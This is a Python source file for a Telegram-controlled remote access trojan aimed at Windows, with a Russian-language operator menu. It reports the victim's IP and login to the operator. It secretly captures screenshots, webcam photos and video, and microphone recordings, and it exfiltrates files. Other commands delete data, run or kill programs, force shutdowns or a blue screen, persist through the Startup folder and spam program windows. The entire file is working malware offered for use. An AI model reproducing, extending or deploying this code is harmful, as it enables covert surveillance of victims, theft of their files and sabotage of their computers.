    # -*- coding: utf8 -*-

import os
import sys
import cv2
import wave
import time
import winreg
import socket
import shutil
import string
import smtplib
import sqlite3
import telebot
import zipfile
import pyaudio
import requests
import platform
import webbrowser
import subprocess
from PIL import ImageGrab
from telebot import types
from telebot import util
from ctypes import *
from ctypes.wintypes import *

token = ' '
adm = ' '
bot = telebot.TeleBot(token)

menu = types.ReplyKeyboardMarkup()
button1 = types.KeyboardButton('/1\n<<')
button2 = types.KeyboardButton('/2\n>>')
button3 = types.KeyboardButton('/Screen\n🖼')
button4 = types.KeyboardButton('/Webcam\n📸')
button5 = types.KeyboardButton('/WebcamVid\n🎥')
button6 = types.KeyboardButton('/Audio\n🎙')
button7 = types.KeyboardButton('/Power\n🔴')
button8 = types.KeyboardButton('/AutoRun\n🔵')
menu.row(button1, button3, button2)
menu.row(button4, button5, button6)
menu.row(button7, button8)

main2 = types.ReplyKeyboardMarkup()
button1 = types.KeyboardButton('/WebcamVid5')
button2 = types.KeyboardButton('/WebcamVid10')
button3 = types.KeyboardButton('/WebcamVid15')
button4 = types.KeyboardButton('/CancelMain')
main2.row(button1)
main2.row(button2)
main2.row(button3)
main2.row(button4)

main3 = types.ReplyKeyboardMarkup()
button1 = types.KeyboardButton('/Audio5')
button2 = types.KeyboardButton('/Audio10')
button3 = types.KeyboardButton('/Audio15')
button4 = types.KeyboardButton('/CancelMain')
main3.row(button1)
main3.row(button2)
main3.row(button3)
main3.row(button4)

main4 = types.ReplyKeyboardMarkup()
button1 = types.KeyboardButton('/PowerOff\n⛔️')
button2 = types.KeyboardButton('/Reboot\n⭕️')
button3 = types.KeyboardButton('/BSoD\n🌀')
button4 = types.KeyboardButton('/CancelMain')
main4.row(button1, button2)
main4.row(button3)
main4.row(button4)

main5 = types.ReplyKeyboardMarkup()
button1 = types.KeyboardButton('/Startup\n📥')
button2 = types.KeyboardButton('/Remove\n♻️')
button3 = types.KeyboardButton('/CancelMain')
main5.row(button1)
main5.row(button2)
main5.row(button3)

main6 = types.ReplyKeyboardMarkup()
button1 = types.KeyboardButton('/3\n<<')
button2 = types.KeyboardButton('/Screen\n🖼')
button3 = types.KeyboardButton('/4\n>>')
button4 = types.KeyboardButton('/Files\n💾')
button5 = types.KeyboardButton('/Tasklist\n📋')
button6 = types.KeyboardButton('/Taskkill\n📝')
main6.row(button1, button2, button3)
main6.row(button4)
main6.row(button5, button6)

main7 = types.ReplyKeyboardMarkup()
button1 = types.KeyboardButton('/CD\n🗂')
button2 = types.KeyboardButton('/PWD\n📄')
button3 = types.KeyboardButton('/Delete\n🗑')
button4 = types.KeyboardButton('/Download\n📨')
button5 = types.KeyboardButton('/Run\n📌')
button6 = types.KeyboardButton('/CancelFiles')
main7.row(button1, button2)
main7.row(button3, button4, button5)
main7.row(button6)

main8 = types.ReplyKeyboardMarkup()
button1 = types.KeyboardButton('/5\n<<')
button2 = types.KeyboardButton('/Screen\n🖼')
button3 = types.KeyboardButton('/6\n>>')
button4 = types.KeyboardButton('/Message\n💬')
button5 = types.KeyboardButton('/OpenURL\n🌐')
button6 = types.KeyboardButton('/OpenEXE\n🔅')
main8.row(button1, button2, button3)
main8.row(button4)
main8.row(button5, button6)

main9 = types.ReplyKeyboardMarkup()
button1 = types.KeyboardButton('/StartFile\n🧨')
button2 = types.KeyboardButton('/InfinityOpen\n💣')
button3 = types.KeyboardButton('/CancelFun')
main9.row(button1, button2)
main9.row(button3)

main10 = types.ReplyKeyboardMarkup()
button1 = types.KeyboardButton('/RunPaint\n🎨')
button2 = types.KeyboardButton('/RunCMD\n◼️')
button3 = types.KeyboardButton('/RunEXE\n💠')
button4 = types.KeyboardButton('/CancelFun')
main10.row(button1, button2)
main10.row(button3)
main10.row(button4)

main11 = types.ReplyKeyboardMarkup()
button1 = types.KeyboardButton('/RuunPaint\n🎨 🎨 🎨')
button2 = types.KeyboardButton('/RuunCMD\n◼️ ◼️ ◼️')
button3 = types.KeyboardButton('/RuunEXE\n💠 💠 💠')
button4 = types.KeyboardButton('/CancelFun')
main11.row(button1, button2)
main11.row(button3)
main11.row(button4)


try:
 r = requests.get('http://ip.42.pl/raw')
 IP = r.text
 bot.send_message(adm, 
 '\n🟢 Online!' + 
 '\n ' + '\nPC » ' + os.getlogin() + 
 '\nOS » ' + platform.system() + ' ' + platform.release() + 
 '\n ' + 
 '\nIP » ' + IP,
 reply_markup=menu)
except:
 time.sleep(60)
 os.startfile(sys.argv[0])

@bot.message_handler(commands=['Start', 'start'])
def start(command):
 bot.send_chat_action(adm, 'typing')
 bot.send_message(adm, 
  'Привет, хацкер!'
  '\n'
  '\n—————————————————————' 
  '\nЧтобы узнать команды ратника, используйте' 
  '\n• /Help'
  '\n—————————————————————' 
  '\n'
  '\n`Coded by Bainky` | @bainki 👾', 
  parse_mode="Markdown")

@bot.message_handler(commands=['Help', 'help'])
def help(command):
 bot.send_chat_action(adm, 'typing')
 bot.send_message(adm,
  'ᅠᅠᅠᅠᅠ ⚙️ *Команды* ⚙️'
  '\n'
  '\n—————————————————————'
  '\n/Screen -  Скриншот экрана'
  '\n/Webcam - Фото с вебки'
  '\n/WebcamVid - Видео с вебки'
  '\n/Audio - Запись микрофона'
  '\n/Power - Управление питанием'
  '\n> /PowerOff - Выключить'
  '\n> /Reboot - Перезагрузить'
  '\n> /BSoD - Синий экран смерти'
  '\n/AutoRun - Сохранить | Удалить'
  '\n> /Startup - Добавить в автозагрузку'
  '\n> /Remove - Удалить ратник'
  '\n—————————————————————'
  '\n/Files - Файловый менеджер'
  '\n> /CD - Текущая директория'
  '\n> /Pwd - Просмотр содержимого'
  '\n> /Delete - Удалить файл'
  '\n> /Download - Скачать файл'
  '\n> /Run - Запустить файл'
  '\n/Tasklist - Список процессов'
  '\n/Taskkill - Остановить процесс'
  '\n—————————————————————'
  '\n/Message - Отправить сообщение'
  '\n/OpenURL - Открыть ссылку'
  '\n/OpenEXE - Открыть программу'
  '\n> /StartFile - Открыть один раз'
  '\n> /InfinityOpen - Открыть много раз'
  '\n—————————————————————'
  '\n '
  '\n`Coded by Bainky` | @bainki 👾', 
  reply_markup=menu, parse_mode="Markdown")

@bot.message_handler(commands=['3', '6'])
def main(command):
 bot.send_chat_action(adm, 'typing')
 bot.send_message(adm, 'ok', reply_markup=menu)

@bot.message_handler(commands=['2', '5'])
def main(command):
 bot.send_chat_action(adm, 'typing')
 bot.send_message(adm, 'ok', reply_markup=main6)

@bot.message_handler(commands=['4', '1'])
def main(command):
 bot.send_chat_action(adm, 'typing')
 bot.send_message(adm, 'ok', reply_markup=main8)

@bot.message_handler(commands=['Screen', 'screen'])
def screen(command):
 bot.send_chat_action(adm, 'upload_photo')
 screen = ImageGrab.grab()
 screen.save(os.getenv("ProgramData") + '\\Screenshot.jpg')
 screen = open('C:\\ProgramData\\Screenshot.jpg', 'rb')
 bot.send_photo(adm, screen)
 screen.close()
 try:
  os.remove('C:\\ProgramData\\Screenshot.jpg')
 except:
  print('Error > Screenshot')

@bot.message_handler(commands=['Webcam', 'webcam'])
def webcam(command):
 bot.send_chat_action(adm, 'upload_photo')
 try:
    cap = cv2.VideoCapture(0)
    for i in range(30):
       cap.read()
    ret, frame = cap.read()
    cv2.imwrite('C:\\ProgramData\\Webcam.jpg', frame)   
    cap.release()
    webcam = open('C:\\ProgramData\\Webcam.jpg', 'rb')
    bot.send_photo(adm, webcam)
    webcam.close()
    os.remove('C:\\ProgramData\\Webcam.jpg')
 except:
 	bot.send_message(adm, '*Камера не найдена*', parse_mode="Markdown")

@bot.message_handler(commands=['WebcamVid', 'webcamvid'])
def webcam(command):
 bot.send_chat_action(adm, 'typing')
 bot.send_message(adm, '*Выберите длительность видео*', reply_markup=main2, parse_mode='Markdown')

@bot.message_handler(commands=['WebcamVid5', 'webcamvid5'])
def webcam5(command):
 try:
   bot.send_message(adm, "Подождите...", reply_markup=menu)
   bot.send_chat_action(adm, 'upload_video')
   capture_duration = 5
   cap = cv2.VideoCapture(0)
   fourcc = cv2.VideoWriter_fourcc(*'XVID')
   out = cv2.VideoWriter('C:\\ProgramData\\WebcamVid.mp4',fourcc, 20.0, (640,480))
   start_time = time.time()
   while( int(time.time() - start_time) < capture_duration ):
      ret, frame = cap.read()
      if ret==True:
          frame = cv2.flip(frame,1)
          out.write(frame)
      else:
          break
   cap.release()
   out.release()
   cv2.destroyAllWindows()
   webcamvid = open('C:\\ProgramData\\WebcamVid.mp4', 'rb')
   bot.send_video(adm, webcamvid)
   webcamvid.close()
   os.remove('C:\\ProgramData\\WebcamVid.mp4')
 except:
	 bot.send_message(adm, '*Камера не найдена*', parse_mode="Markdown")

@bot.message_handler(commands=['WebcamVid10', 'webcamvid10'])
def webcam10(command):
 try:
   bot.send_message(adm, "Подождите...", reply_markup=menu)
   bot.send_chat_action(adm, 'upload_video')
   capture_duration = 10
   cap = cv2.VideoCapture(0)
   fourcc = cv2.VideoWriter_fourcc(*'XVID')
   out = cv2.VideoWriter('C:\\ProgramData\\WebcamVid.mp4',fourcc, 20.0, (640,480))
   start_time = time.time()
   while( int(time.time() - start_time) < capture_duration ):
      ret, frame = cap.read()
      if ret==True:
          frame = cv2.flip(frame,1)
          out.write(frame)
      else:
          break
   cap.release()
   out.release()
   cv2.destroyAllWindows()
   webcamvid = open('C:\\ProgramData\\WebcamVid.mp4', 'rb')
   bot.send_video(adm, webcamvid)
   webcamvid.close()
   os.remove('C:\\ProgramData\\WebcamVid.mp4')
 except:
	 bot.send_message(adm, '*Камера не найдена*', parse_mode="Markdown")

@bot.message_handler(commands=['WebcamVid15', 'webcamvid15'])
def webcam15(command):
 try:
   bot.send_message(adm, "Подождите...", reply_markup=menu)
   bot.send_chat_action(adm, 'upload_video')
   capture_duration = 15
   cap = cv2.VideoCapture(0)
   fourcc = cv2.VideoWriter_fourcc(*'XVID')
   out = cv2.VideoWriter('C:\\ProgramData\\WebcamVid.mp4',fourcc, 20.0, (640,480))
   start_time = time.time()
   while( int(time.time() - start_time) < capture_duration ):
      ret, frame = cap.read()
      if ret==True:
          frame = cv2.flip(frame,1)
          out.write(frame)
      else:
          break
   cap.release()
   out.release()
   cv2.destroyAllWindows()
   webcamvid = open('C:\\ProgramData\\WebcamVid.mp4', 'rb')
   bot.send_video(adm, webcamvid)
   webcamvid.close()
   os.remove('C:\\ProgramData\\WebcamVid.mp4')
 except:
     bot.send_message(adm, '*Камера не найдена*', parse_mode="Markdown")
 
@bot.message_handler(commands=['Audio', 'audio'])
def audio(command):
 bot.send_chat_action(adm, 'typing')
 bot.send_message(adm, '*Выберите длительность записи*', reply_markup=main3, parse_mode="Markdown")

@bot.message_handler(commands=['Audio5', 'audio5'])
def audio5(command):
 bot.send_message(adm, "Подождите...", reply_markup=menu)
 bot.send_chat_action(adm, 'record_audio')
 CHUNK = 1024
 FORMAT = pyaudio.paInt16
 CHANNELS = 2
 RATE = 44100
 RECORD_SECONDS = 5
 WAVE_OUTPUT_FILENAME = "C:\\ProgramData\\voice.wav"
 p = pyaudio.PyAudio()
 stream = p.open(format=FORMAT,
                channels=CHANNELS,
                rate=RATE,
                input=True,
                frames_per_buffer=CHUNK)
 frames = []
 for i in range(0, int(RATE/CHUNK * RECORD_SECONDS)):
    data = stream.read(CHUNK)
    frames.append(data)
 stream.stop_stream()
 stream.close()
 p.terminate()
 wf = wave.open(WAVE_OUTPUT_FILENAME, 'wb')
 wf.setnchannels(CHANNELS)
 wf.setsampwidth(p.get_sample_size(FORMAT))
 wf.setframerate(RATE)
 wf.writeframes(b''.join(frames))
 wf.close()
 voice = open("C:\\ProgramData\\voice.wav", "rb")
 bot.send_voice(adm, voice)
 voice.close()
 try:
 	os.remove("C:\\ProgramData\\voice.wav")
 except:
 	print('Error > Audio')

@bot.message_handler(commands=['Audio10', 'audio10'])
def audio10(command):
 bot.send_message(adm, "Подождите...", reply_markup=menu)
 bot.send_chat_action(adm, 'record_audio')
 CHUNK = 1024
 FORMAT = pyaudio.paInt16
 CHANNELS = 2
 RATE = 44100
 RECORD_SECONDS = 10
 WAVE_OUTPUT_FILENAME = "C:\\ProgramData\\voice.wav"
 p = pyaudio.PyAudio()
 stream = p.open(format=FORMAT,
                channels=CHANNELS,
                rate=RATE,
                input=True,
                frames_per_buffer=CHUNK)
 frames = []
 for i in range(0, int(RATE/CHUNK * RECORD_SECONDS)):
    data = stream.read(CHUNK)
    frames.append(data)
 stream.stop_stream()
 stream.close()
 p.terminate()
 wf = wave.open(WAVE_OUTPUT_FILENAME, 'wb')
 wf.setnchannels(CHANNELS)
 wf.setsampwidth(p.get_sample_size(FORMAT))
 wf.setframerate(RATE)
 wf.writeframes(b''.join(frames))
 wf.close()
 voice = open("C:\\ProgramData\\voice.wav", "rb")
 bot.send_voice(adm, voice)
 voice.close()
 try:
 	os.remove("C:\\ProgramData\\voice.wav")
 except:
 	print('Error > Audio')

@bot.message_handler(commands=['Audio15', 'audio15'])
def audio15(command):
 bot.send_message(adm, "Подождите...", reply_markup=menu)
 bot.send_chat_action(adm, 'record_audio')
 CHUNK = 1024
 FORMAT = pyaudio.paInt16
 CHANNELS = 2
 RATE = 44100
 RECORD_SECONDS = 15
 WAVE_OUTPUT_FILENAME = "C:\\ProgramData\\voice.wav"
 p = pyaudio.PyAudio()
 stream = p.open(format=FORMAT,
                channels=CHANNELS,
                rate=RATE,
                input=True,
                frames_per_buffer=CHUNK)
 frames = []
 for i in range(0, int(RATE/CHUNK * RECORD_SECONDS)):
    data = stream.read(CHUNK)
    frames.append(data)
 stream.stop_stream()
 stream.close()
 p.terminate()
 wf = wave.open(WAVE_OUTPUT_FILENAME, 'wb')
 wf.setnchannels(CHANNELS)
 wf.setsampwidth(p.get_sample_size(FORMAT))
 wf.setframerate(RATE)
 wf.writeframes(b''.join(frames))
 wf.close()
 voice = open("C:\\ProgramData\\voice.wav", "rb")
 bot.send_voice(adm, voice)
 voice.close()
 try:
 	os.remove("C:\\ProgramData\\voice.wav")
 except:
 	print('Error > Audio')

@bot.message_handler(commands=['Power', 'power'])
def power(command):
 bot.send_chat_action(adm, 'typing')
 bot.send_message(adm, '*Выберите действие*', reply_markup=main4, parse_mode="Markdown")

@bot.message_handler(commands=['Reboot', 'reboot'])
def reboot(command):
 bot.send_chat_action(adm, 'typing')
 bot.send_message(adm, '*Компьютер перезагружен! ✔️*', reply_markup=menu, parse_mode="Markdown")
 os.system('shutdown -r /t 0 /f')

@bot.message_handler(commands=['PowerOff', 'PowerOff'])
def poweroff(command):
 bot.send_chat_action(adm, 'typing')
 bot.send_message(adm, '*Компьютер выключен! ✔️*', reply_markup=menu, parse_mode="Markdown")
 os.system('shutdown -s /t 0 /f')

@bot.message_handler(commands=['BSoD', 'bsod'])
def bsod(command):
 try:
    bot.send_chat_action(adm, 'typing')
    bot.send_message(adm, '*BSoD Активирован! ✔️*', reply_markup=menu, parse_mode="Markdown")
    tmp1 = c_bool()
    tmp2 = DWORD()
    ctypes.windll.ntdll.RtlAdjustPrivilege(19, 1, 0, byref(tmp1))
    ctypes.windll.ntdll.NtRaiseHardError(0xc0000022, 0, 0, 0, 6, byref(tmp2))
 except:
 	bot.send_message(adm, 'Error > BSoD')

@bot.message_handler(commands=['AutoRun', 'autorun'])
def autorun(command):
 bot.send_chat_action(adm, 'typing')
 bot.send_message(adm, '*Выберите действие*', reply_markup=main5, parse_mode="Markdown")

@bot.message_handler(commands=['Startup', 'startup'])
def startup(commands):
 bot.send_chat_action(adm, 'typing')
 try:
  shutil.copy2((sys.argv[0]), r'C:\\Users\\' + os.getlogin() + '\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup')
  bot.send_message(adm, '*' + os.path.basename(sys.argv[0]) + ' скопирован в автозагрузку! ✔️*', parse_mode="Markdown")
  os.startfile('C:\\Users\\' + os.getlogin() + '\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\' + os.path.basename(sys.argv[0]))
  bot.send_message(adm, '*' + os.path.basename(sys.argv[0]) + ' запущен из автозагрузки! ✔️*', parse_mode="Markdown")
  bot.send_message(adm, '*Завершаем текущий процесс...*', parse_mode="Markdown")
 except:
  bot.send_message(adm, '*Ошибка ❌*', reply_markup=menu, parse_mode="Markdown")

@bot.message_handler(commands=['Remove', 'remove'])
def remove(command):
 try:
  shutil.move(sys.argv[0], 'C:\\ProgramData')
  bot.send_message(adm, '*' + os.path.basename(sys.argv[0]) + ' удален с компьютера! ✔️*', parse_mode="Markdown")
  bot.send_message(adm, '*Завершаем текущий процесс...*', parse_mode="Markdown")
  os.system('taskkill /im ' + os.path.basename(sys.argv[0]) + ' /f')
 except:
  bot.send_message(adm, '*Ошибка ❌*', parse_mode="Markdown")

@bot.message_handler(commands=['CancelMain', 'cancelmain'])
def cancel(command):
 bot.send_chat_action(adm, 'typing')
 bot.send_message(adm, 'ok', reply_markup=menu)

@bot.message_handler(commands=['Files', 'files'])
def files(command):
 bot.send_chat_action(adm, 'typing')
 bot.send_message(adm, 'ok', reply_markup=main7)

@bot.message_handler(commands=['CD'])
def cd(message):
 try:
  bot.send_chat_action(adm, 'typing')
  user_msg = "{0}".format(message.text)
  os.chdir(user_msg.split("/CD ")[1])
  bot.send_message(adm, '*Директория изменена*\n \n`' + os.getcwd() + '`', parse_mode="Markdown")
 except FileNotFoundError:
  bot.send_message(adm, '*Директория не найдена*', parse_mode="Markdown")
 except:
  bot.send_message(adm, '*Текущая директория*\n \n`' + os.getcwd() + '`', parse_mode="Markdown")

@bot.message_handler(commands=['cd'])
def cd(message):
 try:
  bot.send_chat_action(adm, 'typing')
  user_msg = "{0}".format(message.text)
  os.chdir(user_msg.split("/cd ")[1])
  bot.send_message(adm, '*Директория изменена*\n \n`' + os.getcwd() + '`', parse_mode="Markdown")
 except FileNotFoundError:
  bot.send_message(adm, '*Директория не найдена*', parse_mode="Markdown")
 except:
  bot.send_message(adm, '*Текущая директория*\n \n`' + os.getcwd() + '`', parse_mode="Markdown")

@bot.message_handler(commands=['Delete'])
def delete(message):
 try:
  bot.send_chat_action(adm, 'typing')
  user_msg = "{0}".format(message.text)
  os.remove(os.getcwd() + '\\' + user_msg.split("/Delete ")[1])
  bot.send_message(adm, 'Файл *' + user_msg.split("/Delete ")[1] + '* удален!', parse_mode="Markdown")
 except:
  try:
    shutil.rmtree(os.getcwd() + '\\' + user_msg.split("/Delete ")[1])
    bot.send_message(adm, 'Файл *' + user_msg.split("/Delete ")[1] + '* удален!', parse_mode="Markdown")
  except FileNotFoundError:
 	 bot.send_message(adm, '*Файл не найден*', parse_mode="Markdown")
  except:
     bot.send_message(adm, '*Введите название файла*\n \n/Delete', parse_mode="Markdown")

@bot.message_handler(commands=['delete'])
def delete(message):
 try:
  bot.send_chat_action(adm, 'typing')
  user_msg = "{0}".format(message.text)
  os.remove(os.getcwd() + '\\' + user_msg.split("/delete ")[1])
  bot.send_message(adm, 'Файл *' + user_msg.split("/delete ")[1] + '* удален!', parse_mode="Markdown")
 except:
  try:
    shutil.rmtree(os.getcwd() + '\\' + user_msg.split("/delete ")[1])
    bot.send_message(adm, 'Файл *' + user_msg.split("/delete ")[1] + '* удален!', parse_mode="Markdown")
  except FileNotFoundError:
 	 bot.send_message(adm, '*Файл не найден*', parse_mode="Markdown")
  except:
     bot.send_message(adm, '*Введите название файла*\n \n/delete', parse_mode="Markdown")

@bot.message_handler(commands=['Download'])
def download(message):
 try:
  user_msg = "{0}".format(message.text)
  download = open(os.getcwd() + '\\' + user_msg.split("/Download ")[1], 'rb')
  bot.send_chat_action(adm, 'upload_document')
  bot.send_document(adm, download)
 except:
 	try:
 		shutil.make_archive('C:\\ProgramData\\' + user_msg.split("/Download ")[1],
                            'zip',
                            os.getcwd(),
                            user_msg.split("/Download ")[1])
 		bot.send_chat_action(adm, 'upload_document')
 		file = open('C:\\ProgramData\\' + user_msg.split("/Download ")[1] + '.zip', 'rb')
 		bot.send_document(adm, file)
 		file.close()
 		os.remove('C:\\ProgramData\\' + user_msg.split("/Download ")[1] + '.zip')
 	except:
 		try:
 			os.remove('C:\\ProgramData\\' + user_msg.split("/Download ")[1] + '.zip')
 			bot.send_message(adm, '*Файл не найден*', parse_mode="Markdown")
 		except:
       		 bot.send_message(adm, '*Введите название файла*\n \n/Download', parse_mode="Markdown")

@bot.message_handler(commands=['download'])
def download(message):
 try:
  user_msg = "{0}".format(message.text)
  download = open(os.getcwd() + '\\' + user_msg.split("/download ")[1], 'rb')
  bot.send_chat_action(adm, 'upload_document')
  bot.send_document(adm, download)
 except:
 	try:
 		shutil.make_archive('C:\\ProgramData\\' + user_msg.split("/download ")[1],
                            'zip',
                            os.getcwd(),
                            user_msg.split("/download ")[1])
 		bot.send_chat_action(adm, 'upload_document')
 		file = open('C:\\ProgramData\\' + user_msg.split("/download ")[1] + '.zip', 'rb')
 		bot.send_document(adm, file)
 		file.close()
 		os.remove('C:\\ProgramData\\' + user_msg.split("/download ")[1] + '.zip')
 	except FileNotFoundError:
 		os.remove('C:\\ProgramData\\' + user_msg.split("/download ")[1] + '.zip')
 		bot.send_message(adm, '*Файл не найден*', parse_mode="Markdown")
 	except:
       	 bot.send_message(adm, '*Введите название файла*\n \n/download', parse_mode="Markdown")

@bot.message_handler(commands=['Run'])
def run(message):
 try:
  bot.send_chat_action(adm, 'typing')
  user_msg = "{0}".format(message.text)
  os.startfile(os.getcwd() + '\\' + user_msg.split("/Run ")[1])
  bot.send_message(adm, 'Файл *' + user_msg.split("/Run ")[1] + '* запущен!', parse_mode="Markdown")
 except FileNotFoundError:
 	bot.send_message(adm, '*Файл не найден*', parse_mode="Markdown")
 except:
 	bot.send_message(adm, '*Введите название файла*\n \n/Run', parse_mode="Markdown")

@bot.message_handler(commands=['run'])
def run(message):
 try:
  bot.send_chat_action(adm, 'typing')
  user_msg = "{0}".format(message.text)
  os.startfile(os.getcwd() + '\\' + user_msg.split("/run ")[1])
  bot.send_message(adm, 'Файл *' + user_msg.split("/run ")[1] + '* запущен!', parse_mode="Markdown")
 except FileNotFoundError:
 	bot.send_message(adm, '*Файл не найден*', parse_mode="Markdown")
 except:
    bot.send_message(adm, '*Введите название файла*\n \n/Run', parse_mode="Markdown")

@bot.message_handler(commands=['PWD', 'pwd'])
def pwd(commands):
 try:
  bot.send_chat_action(adm, 'typing')
  dirs = '\n``'.join(os.listdir(path="."))
  bot.send_message(adm, '`' + os.getcwd() + '`\n \n' + '`' + dirs + '`', parse_mode="Markdown")
 except:
  try:
    bot.send_chat_action(adm, 'typing')
    dirse = '\n'.join(os.listdir(path="."))
    splitted_text = util.split_string(dirse, 4096)
    for dirse in splitted_text:
      bot.send_message(adm, '`' + dirse + '`', parse_mode="Markdown")
  except:
    bot.send_message(adm, 'Error > PWD')

@bot.message_handler(commands=['CancelFiles', 'cancelfiles'])
def cancelfiles(commands):
 bot.send_chat_action(adm, 'typing')
 bot.send_message(adm, 'ok', reply_markup=main6)

@bot.message_handler(commands=['Tasklist', 'tasklist'])
def tasklist(command):
 try:
  bot.send_chat_action(adm, 'upload_document')
  os.system('tasklist>  C:\\ProgramData\\Tasklist.txt')
  tasklist = open('C:\\ProgramData\\Tasklist.txt')
  bot.send_document(adm, tasklist)
  tasklist.close()
  os.remove('C:\\ProgramData\\Tasklist.txt')
 except:
  bot.send_message(adm, 'Error > Tasklist')

@bot.message_handler(commands=['Taskkill', 'taskkill'])
def taskkill(message):
 try:
  bot.send_chat_action(adm, 'typing')
  user_msg = "{0}".format(message.text)
  subprocess.call("taskkill /f /im  " + user_msg.split(" ")[1] + '.exe')
  bot.send_message(adm, "Процесс *" + user_msg.split(" ")[1] + "* остановлен!", parse_mode="Markdown")
 except:
  bot.send_message(adm, '*Введите название процесса*\n \n/Taskkill', parse_mode="Markdown")

@bot.message_handler(commands=['Message'])
def message(message):
 try:
  bot.send_chat_action(adm, 'typing')
  user_msg = "{0}".format(message.text)
  ctypes.windll.user32.MessageBoxW(0, user_msg.split("/Message ")[1], u'Information', 0x40)
  bot.send_message(adm, 'Сообщение отправленно!')
 except:
  bot.send_message(adm, '*Введите сообщение*\n \n/Message', parse_mode="Markdown")

@bot.message_handler(commands=['message'])
def message(message):
 try:
  bot.send_chat_action(adm, 'typing')
  bot.send_message(adm, 'Сообщение отправленно!')
  user_msg = "{0}".format(message.text)
  ctypes.windll.user32.MessageBoxW(0, user_msg.split("/message ")[1], u'Information', 0x40)
 except:
  bot.send_message(adm, '*Введите сообщение*\n \n/message', parse_mode="Markdown")

@bot.message_handler(commands=['OpenURL', 'openurl'])
def openurl(message):
 try:
  bot.send_chat_action(adm, 'typing')
  user_msg = "{0}".format(message.text)
  url = user_msg.split(" ")[1]
  webbrowser.open_new_tab(url)
  bot.send_message(adm, "Ссылка открыта!")
 except:
  bot.send_message(adm, '*Вставьте ссылку*\n \n/OpenURL', parse_mode="Markdown")

@bot.message_handler(commands=['OpenEXE', 'openexe'])
def openexe(commands):
 bot.send_chat_action(adm, 'typing')
 bot.send_message(adm, 'ok', reply_markup=main9)

@bot.message_handler(commands=['StartFile', 'startfile'])
def startfile(commands):
 bot.send_chat_action(adm, 'typing')
 bot.send_message(adm, '*Выберите программу*', reply_markup=main10, parse_mode="Markdown")

@bot.message_handler(commands=['RunPaint', 'runpaint'])
def runpaint(commands):
 try:
  bot.send_chat_action(adm, 'typing')
  os.startfile('mspaint.exe')
  bot.send_message(adm, 'Готово!')
 except:
  bot.send_message(adm, 'Error > RunPaint')

@bot.message_handler(commands=['RunCMD', 'runcmd'])
def runcmd(commands):
 try:
  bot.send_chat_action(adm, 'typing')
  os.startfile('cmd.exe')
  bot.send_message(adm, 'Готово!')
 except:
  bot.send_message(adm, 'Error > RunCMD')

@bot.message_handler(commands=['RunEXE', 'runexe'])
def runexe(message):
 try:
  bot.send_chat_action(adm, 'typing')
  user_msg = "{0}".format(message.text)
  os.startfile(user_msg.split(" ")[1] + '.exe')
  bot.send_message(adm, 'Готово!')
 except:
  bot.send_message(adm, '*Введите имя программы* \n \n/RuunEXE', parse_mode="Markdown")

@bot.message_handler(commands=['InfinityOpen', 'infinityopen'])
def infinityopen(commands):
 bot.send_chat_action(adm, 'typing')
 bot.send_message(adm, '*Выберите программу*', reply_markup=main11, parse_mode="Markdown")

@bot.message_handler(commands=['RuunPaint', 'ruunpaint'])
def ruunpaint(commands):
 try:
  bot.send_chat_action(adm, 'typing')
  bot.send_message(adm, 'Готово!')
  while True:
    os.startfile('mspaint.exe')
 except:
  bot.send_message(adm, 'Error > Paint')

@bot.message_handler(commands=['RuunCMD', 'ruuncmd'])
def ruuncmd(commands):
 try:
  bot.send_chat_action(adm, 'typing')
  bot.send_message(adm, 'Готово!')
  while True:
    os.startfile('cmd.exe')
 except:
  bot.send_message(adm, 'Error > CMD')

@bot.message_handler(commands=['RuunEXE', 'ruunexe'])
def ruunexe(message):
  bot.send_chat_action(adm, 'typing')
  bot.send_message(adm, 'Готово!')
  while True:
    try:
      user_msg = "{0}".format(message.text)
      os.startfile(user_msg.split(" ")[1] + '.exe')
    except:
      bot.send_message(adm, '*Введите имя программы* \n \n/RuunEXE', parse_mode="Markdown")
      break

@bot.message_handler(commands=['CancelFun', 'cancelfun'])
def cancelfun(commands):
 bot.send_chat_action(adm, 'typing')
 bot.send_message(adm, 'ok', reply_markup=main8)

try:
  bot.polling()
except:
  os.startfile(os.startfile(sys.argv[0]))
  sys.exit()
